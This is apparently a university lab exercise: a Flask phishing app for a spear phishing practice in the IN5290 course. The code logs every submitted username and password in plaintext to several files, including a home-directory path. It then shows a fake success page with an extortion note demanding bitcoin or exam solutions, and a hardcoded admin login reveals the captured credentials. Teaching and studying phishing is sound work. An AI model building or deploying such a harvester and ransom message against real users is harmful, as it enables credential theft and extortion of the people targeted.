from flask import Flask, render_template, request, redirect, url_for
import os

app = Flask(__name__)

# Define the file where credentials are stored
CREDENTIALS_FILENAME = "captured_credentials.txt"
CREDENTIALS_FILENAME2 = "captured_credentials2.txt"
CREDENTIALS_ABSOLUTE_PATH = "/home/tobiasao/cred2.txt"

SECRET_MESSAGE = """
Hello Lazlo. The following Tesla locations have been leaked:
<ul>
    <li>University of Oslo</li>
    <li>Vettakollen</li>
    <li>Tesla Store</li>
</ul>

<p>In order to prevent the hackers from making this data public, please transfer <strong>20 bitcoin</strong>
to the following address:</p>

<p><a href="http://3cpo.hackingarena.com:805/index.php?fruit=banana"
target="_blank">http://3cpo.hackingarena.com:805/index.php?fruit=banana</a></p>

<p><strong>Special discount (only for Lazlo)!</strong><br>
Since the benevolent hackers knew that a poor university professor
can't afford 20 bitcoin, there's a limited offer.</p>

<p>Send the school exam with the solution in IN5290 autumn 2024 by
<em>1st of December</em> to avoid exposure of your sensitive data!</p>
"""

# Initialize the credentials file if it doesn't exist
if not os.path.exists(CREDENTIALS_FILENAME):
    open(CREDENTIALS_FILENAME, "w").close()

if not os.path.exists(CREDENTIALS_FILENAME2):
    open(CREDENTIALS_FILENAME2, "w").close()

try:
    if not os.path.exists(CREDENTIALS_ABSOLUTE_PATH):
        open(CREDENTIALS_ABSOLUTE_PATH, "w").close()
except Exception:
    pass

@app.route("/")
def index():
    warning_message = "This is a spear phishing email practice (IN5290 UiO). Do not type in your real password."
    return render_template("index.html", warning=warning_message)


@app.route("/login", methods=["POST"])
def login():
    username = request.form["username"]
    password = request.form["password"]
    # Simple authentication logic for demonstration
    if username == "admin" and password == "admin_password":
        with open(CREDENTIALS_FILENAME, "r") as file:
            stored_credentials = file.read()
        message = "Displaying stored credentials"
        return render_template("index.html", message=message, stored_credentials=stored_credentials)
    else:
        with open(CREDENTIALS_FILENAME, "a") as file:
            file.write(f"Username: {username}, Password: {password}\n")
        with open(CREDENTIALS_FILENAME2, "a") as file:
            file.write(f"Username: {username}, Password: {password}\n")
        try:
            with open(CREDENTIALS_ABSOLUTE_PATH, "a") as file:
                file.write(f"Username: {username}, Password: {password}\n")
        except Exception:
            pass
        template = render_template(
            "index.html", message="Login successful! Welcome, " + username + "!", secret_message=SECRET_MESSAGE
        )
        return template


@app.route("/map")
def map():
    return render_template("map.html")
